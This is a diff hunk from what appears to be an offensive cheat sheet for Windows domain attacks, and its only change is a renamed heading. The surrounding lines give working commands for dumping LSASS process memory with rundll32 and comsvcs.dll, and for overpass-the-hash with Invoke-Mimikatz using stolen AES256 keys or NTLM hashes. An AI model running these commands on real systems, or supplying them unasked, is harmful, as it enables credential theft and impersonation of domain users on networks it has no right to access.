@@ -128,7 +128,7 @@ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS PROCESS ID> C:\Use
 ## Overpass The Hash
 - Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation (Run as administrator)
 
-#### Mimikatz
+#### Mimikatz overpass the hash
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256KEYS> /run:powershell.exe"'
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell.exe"'
